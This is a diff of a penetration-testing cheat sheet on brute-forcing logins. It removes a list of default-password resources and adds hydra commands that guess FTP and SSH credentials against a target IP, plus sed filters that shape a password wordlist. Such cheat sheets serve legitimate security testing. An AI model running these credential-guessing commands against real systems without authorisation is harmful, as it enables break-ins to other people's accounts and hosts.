@@ -1,27 +1,8 @@
 # Brute Force - CheatSheet
 
-## Default Credentials
+#### Fkn Check for Default Credentials
 
-**Search in google** for default credentials of the technology that is being used, or **try these links**:
-
-[https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
-[http://www.phenoelit.org/dpl/dpl.html](http://www.phenoelit.org/dpl/dpl.html)
-[http://www.vulnerabilityassessment.co.uk/passwordsC.htm](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
-[https://192-168-1-1ip.mobi/default-router-passwords-list/](https://192-168-1-1ip.mobi/default-router-passwords-list/)
-[https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)
-[https://bizuns.com/default-passwords-list](https://bizuns.com/default-passwords-list)
-[https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
-[https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)
-[https://www.cirt.net/passwords](https://www.cirt.net/passwords)
-[http://www.passwordsdatabase.com/](http://www.passwordsdatabase.com)
-[https://many-passwords.github.io/](https://many-passwords.github.io)
-[https://theinfocentric.com/](https://theinfocentric.com/)
-
-## **Create your own Dictionaries**
-
-Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
-
-### Reliable
+#### Reliable
 
 ```bash
 cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
@@ -39,6 +20,16 @@ echo sales >> users.txt
 ```
 hydra -L valid.txt -P valid.txt $ip ftp -I
 hydra -L valid.txt -P valid.txt $ip ssh -I
+```
+
+```bash
+# Try username, hostname as passwords
+```
+
+```bash
+sed -ri '/^.{,7}$/d' custom-passwords.txt #   Remove Passwords Shorter Than 8
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' custom-passwords.txt   #  Remove Passwords With No Special Chars
+sed -ri '/[0-9]+/!d' custom-passwords.txt #   Remove Passwords With No Numbers
 ```
 
 ### Crunch
